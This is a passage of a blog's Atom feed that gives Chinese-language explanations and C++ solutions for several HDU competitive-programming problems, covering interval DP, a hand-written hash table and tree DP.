class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> CN = <span class="number">111</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1000000007</span>;</div><div class="line">ll c[CN][CN]= &#123;&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">cinit</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</div><div class="line">        c[i][<span class="number">0</span>] = c[i][i] = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</div><div class="line">            c[i][j] = c[i - <span class="number">1</span>][j] + c[i - <span class="number">1</span>][j - <span class="number">1</span>];</div><div class="line">            <span class="keyword">if</span> (c[i][j] &gt; mod) c[i][j] -= mod;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ll dp[CN][CN];</div><div class="line"><span class="keyword">int</span> n, a[CN];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    cinit();</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</div><div class="line">            dp[i][i] = <span class="number">1</span>;</div><div class="line">            dp[i][i + <span class="number">1</span>] = <span class="number">2</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">3</span>; l &lt;= n; l++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + l &lt;= n; i++) &#123;</div><div class="line">                <span class="keyword">int</span> j = i + l - <span class="number">1</span>;</div><div class="line">                dp[i][j] = <span class="number">0</span>;</div><div class="line">                <span class="comment">//head</span></div><div class="line">                dp[i][j] += dp[i + <span class="number">1</span>][j];</div><div class="line">                <span class="comment">//mid</span></div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = i + <span class="number">1</span>; k &lt;= j - <span class="number">1</span>; k++) <span class="keyword">if</span> (a[k - <span class="number">1</span>] == a[k + <span class="number">1</span>]) &#123;</div><div class="line">                    dp[i][j] += c[l - <span class="number">1</span>][k - i] * dp[i][k - <span class="number">1</span>] % mod * dp[k + <span class="number">1</span>][j] % mod;</div><div class="line">                    dp[i][j] %= mod;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">//tail</span></div><div class="line">                dp[i][j] += dp[i][j - <span class="number">1</span>];</div><div class="line">                dp[i][j] %= mod;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, dp[<span class="number">0</span>][n - <span class="number">1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5151&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5151&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;有n个人陆续坐到n个椅子上，每张椅子为两种颜色中的一种。每个人每次可以选择一个空位置，如果该空位置两边都有人，且两边的椅子颜色不同，那么他便不能坐下，需要离开。现在问n个人全部坐下的方案数&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;dp[i][j]表示编号i-j的位置上都有人坐下的方案数。dp[i][i] = 1, dp[i][i+1] = 2&lt;br&gt;dp[i][j] =sum(dp[i][k-1] &lt;em&gt; dp[k+1][j] &lt;/em&gt; C(j-i, k-i-1)) 当i-k-1有人坐下，k+1-j有人坐下，此时来的人坐在k的方案数累积&lt;br&gt;C(j-i, k-i-1)表示前面的j-i个人有k-i-1个人选择坐在了左边的方案数&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="区间dp" scheme="http://yoursite.com/tags/%E5%8C%BA%E9%97%B4dp/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5085 Counting problem（暴力+HashTable）</title>
    <link href="http://yoursite.com/2015/10/11/hdu5085/"/>
    <id>http://yoursite.com/2015/10/11/hdu5085/</id>
    <published>2015-10-10T17:16:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5085" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5085</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>定义f(n,k) = 各位数字的k次方和。例如f(305, 2) = 5^2 + 0^2 + 3^2 = 34<br>给定a,b,k,s。求[a,b]区间内满足f(n,k)=s的数字个数<br>1≤a≤b≤999999999;    1≤k≤15;    1≤S≤10^16</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>把n分为按照长度分为两半部分，前半部分暴力枚举，后半部分加入hash表中，这样将复杂度降到sqrt(n)hash表中记录每种和的情况数。要注意一些细节：</p><ol><li>不妨设一个B=10000，如果a,b都小于B。直接枚举即可</li><li>当b大于B时，ahead = (a-1) / B, atail = a % B   bhead = b / B, btail = b % B<br>将0~B-1的数字加入hash表时，记录一下以ahead开头符合条件的个数resa，再记录一下以bhead开头的符合条件的resb<br>之后枚举[ahead, bhead), 符合条件的累加到resb中，最后答案即为resb-resa</li></ol><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="comment">//Hash Table</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;ll, ll&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10010</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mod  40007</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HashKey</span> &#123;</span></div><div class="line">    ll key;</div><div class="line">    <span class="keyword">int</span> nxt, cnt;</div><div class="line">&#125; e[MAXN];</div><div class="line"><span class="keyword">int</span> link1[MAXN * <span class="number">4</span>], p, k;</div><div class="line">ll s;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">memset</span>(link1, <span class="number">-1</span>, <span class="keyword">sizeof</span>(link1));</div><div class="line">    p = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(ll key)</span> </span>&#123;</div><div class="line">    e[p].key = key;</div><div class="line">    e[p].cnt = <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> modKey = key % mod;</div><div class="line">    <span class="keyword">if</span> (modKey &lt; <span class="number">0</span>) modKey += mod;</div><div class="line">    e[p].nxt = link1[modKey];</div><div class="line">    link1[modKey] = p++;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(ll key)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> modKey = key % mod;</div><div class="line">    <span class="keyword">if</span> (modKey &lt; <span class="number">0</span>) modKey += mod;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = link1[modKey]; i != <span class="number">-1</span>; i = e[i].nxt) &#123;</div><div class="line">        <span class="keyword">if</span> (e[i].key == key) &#123;</div><div class="line">            <span class="keyword">return</span> i;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"><span class="function">ll <span class="title">calc</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    ll ans = <span class="number">0</span>, tmp = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(x) &#123;</div><div class="line">        <span class="keyword">int</span> t = x % <span class="number">10</span>;</div><div class="line">        x /= <span class="number">10</span>;</div><div class="line">        tmp = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) tmp *= t;</div><div class="line">        ans += tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (ans &gt; s) <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    <span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> x)</span>  </span>&#123;</div><div class="line">    ll ans = calc(x);</div><div class="line">    <span class="keyword">if</span> (ans &gt; s || ans == <span class="number">-1</span>) <span class="keyword">return</span> ;</div><div class="line">    <span class="keyword">int</span> k = Find(ans);</div><div class="line">    <span class="keyword">if</span> (k == <span class="number">-1</span>) add(ans);</div><div class="line">    <span class="keyword">else</span> e[k].cnt++;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">work</span><span class="params">(<span class="keyword">int</span> ahead)</span> </span>&#123;</div><div class="line">    ll ans = calc(ahead);</div><div class="line">    <span class="keyword">if</span> (ans == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (ans &lt;= s) &#123;</div><div class="line">        <span class="keyword">int</span> x = Find(s - ans);</div><div class="line">        <span class="keyword">if</span> (x != <span class="number">-1</span>) <span class="keyword">return</span> e[x].cnt;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    ll a, b;</div><div class="line">    <span class="keyword">int</span> B = <span class="number">10000</span>;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%I64d%I64d%d%I64d"</span>, &amp;a, &amp;b, &amp;k, &amp;s)) &#123;</div><div class="line">        <span class="keyword">if</span> (b &lt; B) &#123;</div><div class="line">            <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = a; i &lt;= b; i++) &#123;</div><div class="line">                <span class="keyword">if</span> (calc(i) == s) res++;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        init();</div><div class="line">        <span class="keyword">int</span> bhead = b / B, btail = b % B;</div><div class="line">        <span class="keyword">int</span> ahead = (a - <span class="number">1</span>) / B, atail = (a - <span class="number">1</span>) % B;</div><div class="line">        ll resa = <span class="number">0</span>, resb = <span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span> (atail &lt; btail) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= atail; i++) solve(i);</div><div class="line">            resa = work(ahead);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = atail + <span class="number">1</span>; i &lt;= btail; i++) solve(i);</div><div class="line">            resb = work(bhead);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = btail + <span class="number">1</span>; i &lt; B; i++) solve(i);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= btail; i++) solve(i);</div><div class="line">            resb = work(bhead);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = btail + <span class="number">1</span>; i &lt;= atail; i++) solve(i);</div><div class="line">            resa = work(ahead);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = atail + <span class="number">1</span>; i &lt; B; i++) solve(i);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = ahead; i &lt; bhead; i++) resb += work(i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, resb - resa);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5085&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5085&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;定义f(n,k) = 各位数字的k次方和。例如f(305, 2) = 5^2 + 0^2 + 3^2 = 34&lt;br&gt;给定a,b,k,s。求[a,b]区间内满足f(n,k)=s的数字个数&lt;br&gt;1≤a≤b≤999999999;    1≤k≤15;    1≤S≤10^16&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;把n分为按照长度分为两半部分，前半部分暴力枚举，后半部分加入hash表中，这样将复杂度降到sqrt(n)hash表中记录每种和的情况数。要注意一些细节：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不妨设一个B=10000，如果a,b都小于B。直接枚举即可&lt;/li&gt;
&lt;li&gt;当b大于B时，ahead = (a-1) / B, atail = a % B   bhead = b / B, btail = b % B&lt;br&gt;将0~B-1的数字加入hash表时，记录一下以ahead开头符合条件的个数resa，再记录一下以bhead开头的符合条件的resb&lt;br&gt;之后枚举[ahead, bhead), 符合条件的累加到resb中，最后答案即为resb-resa&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="HashTable" scheme="http://yoursite.com/tags/HashTable/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5148 Cities（树dp）</title>
    <link href="http://yoursite.com/2015/10/10/hdu5148/"/>
    <id>http://yoursite.com/2015/10/10/hdu5148/</id>
    <published>2015-10-10T12:38:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5148" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5148</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一棵树，数的节点数为n。问从中选出K个点，使得这些点之间的距离和最小</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>考虑每条边的贡献，一条边会把树分成两部分，若在其中一部分里选择了x个点，则这条边被统计的次数为x<em>(K-x)</em>2. 那么考虑dp[u][i]表示在u的子树中选择了i个点的最小代价，有转移dp[u][i] = min(dp[u][i-j]+ dp[v][j] + j<em>(K-j)</em>2*c)​​<br><a id="more"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int, int&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2100</span>;</div><div class="line"><span class="keyword">int</span> K, n;</div><div class="line"><span class="built_in">vector</span>&lt; pii &gt; g[N];</div><div class="line">ll dp[N][<span class="number">55</span>];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(ll &amp;x, ll v)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (x == <span class="number">-1</span> || x &gt; v) x = v;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> fa)</span> </span>&#123;</div><div class="line">    dp[u][<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g[u].size(); i++) &#123;</div><div class="line">        <span class="keyword">int</span> v = g[u][i].fi, c = g[u][i].se;</div><div class="line">        <span class="keyword">if</span> (v == fa) <span class="keyword">continue</span>;</div><div class="line">        dfs(v, u);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = K - <span class="number">1</span>; j &gt;= <span class="number">1</span>; j--) &#123;</div><div class="line">            <span class="keyword">if</span> (dp[u][j] == <span class="number">-1</span>) <span class="keyword">continue</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; j + k &lt;= K; k++) &#123;</div><div class="line">                <span class="keyword">if</span> (dp[v][k] == <span class="number">-1</span>) <span class="keyword">continue</span>;</div><div class="line">                change(dp[u][j + k], dp[u][j] + dp[v][k] + (ll)<span class="number">2</span> * k * (K - k) * c);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> t, u, v, c;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</div><div class="line">    <span class="keyword">while</span>(t--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;K);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            g[i].clear();</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= K; j++) dp[i][j] = <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;c);</div><div class="line">            g[u].pb(&#123;v, c&#125;);</div><div class="line">            g[v].pb(&#123;u, c&#125;);</div><div class="line">        &#125;</div><div class="line">        dfs(<span class="number">1</span>, <span class="number">-1</span>);</div><div class="line">        ll ans = dp[<span class="number">1</span>][K];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) <span class="keyword">if</span> (dp[i][K] != <span class="number">-1</span>) ans = min(ans, dp[i][K]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5148&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5148&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定一棵树，数的节点数为n。问从中选出K个点，使得这些点之间的距离和最小&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;考虑每条边的贡献，一条边会把树分成两部分，若在其中一部分里选择了x个点，则这条边被统计的次数为x&lt;em&gt;(K-x)&lt;/em&gt;2. 那么考虑dp[u][i]表示在u的子树中选择了i个点的最小代价，有转移dp[u][i] = min(dp[u][i-j]+ dp[v][j] + j&lt;em&gt;(K-j)&lt;/em&gt;2*c)​​&lt;br&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="树dp" scheme="http://yoursite.com/tags/%E6%A0%91dp/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5183 Negative and Positive (NP)（HashTable）</title>
    <link href="http://yoursite.com/2015/10/09/hdu5183/"/>
    <id>http://yoursite.com/2015/10/09/hdu5183/</id>
    <published>2015-10-09T12:16:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5183" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5183</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定n个数的序列（A0,A1,A2…,An-1) 规定NP-sum(i,j) = Ai - Ai+1 + Ai+2 + (-1)^(j-i)Aj<br>现在给定一个K，问是否有一个NP-sum(i,j)=K<br>1≤n≤1000000,−1000000000≤ai≤1000000000,−1000000000≤K≤1000000000</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>sum[i]=a1−a2+a3…。手写一个哈希表来保存所有出现过的sum值,然后根据奇偶性分类判断在哈系表中是否存在对应的子序列满足题意</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div 